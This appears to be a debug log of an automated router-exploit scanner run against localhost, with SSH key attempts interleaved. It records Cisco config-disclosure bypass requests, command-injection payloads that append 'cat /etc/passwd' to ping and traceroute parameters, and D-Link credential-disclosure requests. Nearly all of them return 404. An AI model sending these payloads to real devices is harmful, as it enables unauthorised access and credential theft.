+2019-02-24 10:31:57,778 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,779 DEBUG paramiko.transport       Trying SSH key b'dd3bb82e850406e9abffa80ac0046ed6'
+2019-02-24 10:31:57,779 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/39/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,781 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,790 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/40/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,792 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,793 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/41/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,795 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,797 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/42/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,798 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,799 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:57,799 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/43/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,801 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,818 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/44/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,818 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:57,823 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,826 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/45/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,828 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,831 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/46/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,833 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,835 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/47/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,838 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,841 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:57,842 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/48/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,847 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,850 DEBUG paramiko.transport       starting thread (client mode): 0xb4209be0
+2019-02-24 10:31:57,851 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:57,873 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:57,873 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/49/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,883 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:57,908 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,933 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:57,944 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:57,959 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:57,986 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/50/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,991 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,020 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,021 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,021 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,021 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,022 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/51/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,023 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,024 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/52/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,026 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,027 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/53/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,029 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,030 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/54/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,033 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,033 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,034 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/55/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,036 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,036 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,037 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,037 DEBUG paramiko.transport       Trying SSH key b'e44d3e11db3f06be3140d8fe038e468b'
+2019-02-24 10:31:58,037 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/56/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,039 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,040 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/57/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,042 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,043 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/58/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,045 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,045 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/59/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,047 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,048 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/60/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,049 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,053 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/61/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,065 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,065 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/62/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,068 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,068 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/63/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,070 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,071 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/64/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,072 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,073 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/65/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,074 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,075 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/66/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,077 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,077 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,080 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/67/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,082 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,083 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/68/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,084 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,085 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/69/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,086 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,087 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/70/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,088 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,089 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/71/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,090 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,091 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/72/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,092 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,093 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,095 DEBUG paramiko.transport       starting thread (client mode): 0xa47bd438
+2019-02-24 10:31:58,095 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/73/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,098 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,098 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:58,099 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/74/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,100 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,101 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:58,101 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:58,101 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/75/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,103 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,104 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/76/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,105 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,106 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:58,106 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:58,106 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,106 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,107 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/77/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,107 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,108 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,108 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,109 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/78/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,112 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,113 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/79/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,114 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,115 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/80/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,117 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,117 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/81/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,119 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,120 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/82/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,120 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,121 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,122 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,122 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/83/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,123 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,124 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,124 DEBUG paramiko.transport       Trying SSH key b'0c8949f762d298f02775ade9722c68c3'
+2019-02-24 10:31:58,125 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/84/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,126 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,127 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/85/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,128 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,129 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/86/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,130 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,131 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/87/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,133 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,133 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/88/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,135 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,135 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/89/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,136 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,137 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/90/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,138 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,139 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/91/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,140 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,141 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/92/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,142 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,143 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/93/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,144 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,145 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/94/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,146 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,146 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/95/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,148 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,148 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/96/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,150 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,150 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/97/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,152 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,152 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/98/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,154 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,154 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/99/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:58,156 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,156 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd; HTTP/1.1" 404 None
+2019-02-24 10:31:58,158 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,159 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd; HTTP/1.1" 404 None
+2019-02-24 10:31:58,160 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,161 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1%7Ccat+/etc/passwd; HTTP/1.1" 404 None
+2019-02-24 10:31:58,163 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,164 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,165 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /web_shell_cmd.gch HTTP/1.1" 404 169
+2019-02-24 10:31:58,168 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,170 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:58,172 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,173 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /hedwig.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:58,174 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,175 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /getcfg.php?A=A%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d1 HTTP/1.1" 404 None
+2019-02-24 10:31:58,178 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,178 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,179 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:58,184 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,184 DEBUG paramiko.transport       starting thread (client mode): 0xa47bdb38
+2019-02-24 10:31:58,185 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:58,185 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /hedwig.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:58,187 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,187 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:58,188 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:58,189 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /cgi-bin/webproc HTTP/1.1" 404 169
+2019-02-24 10:31:58,190 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,191 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:58,191 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:58,191 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:58,192 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,193 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,194 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:58,194 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,194 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,195 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,195 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((175673-1));echo%20ffffffffffffffff; HTTP/1.1" 404 169
+2019-02-24 10:31:58,197 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:58,198 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /bsc_lan.php HTTP/1.1" 404 None
+2019-02-24 10:31:58,238 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,239 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,239 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,239 DEBUG paramiko.transport       Trying SSH key b'b811320998f47d9470b85c03f270a421'
+2019-02-24 10:31:58,279 DEBUG paramiko.transport       EOF in transport thread
